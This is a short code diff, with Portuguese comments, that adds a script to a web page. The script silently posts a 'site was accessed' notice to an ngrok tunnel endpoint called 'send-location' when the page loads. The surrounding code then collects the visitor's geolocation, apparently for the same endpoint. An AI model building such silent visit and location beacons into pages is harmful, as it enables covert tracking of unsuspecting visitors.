@@ -22,6 +22,16 @@
   </div>
 
   <script>
+    // Envia mensagem de acesso ao servidor
+    fetch("https://9d7a-2804-d59-8c25-2f00-b4fa-f6d4-f439-2bab.ngrok-free.app/send-location", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        message: "O site foi acessado."
+      })
+    });
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
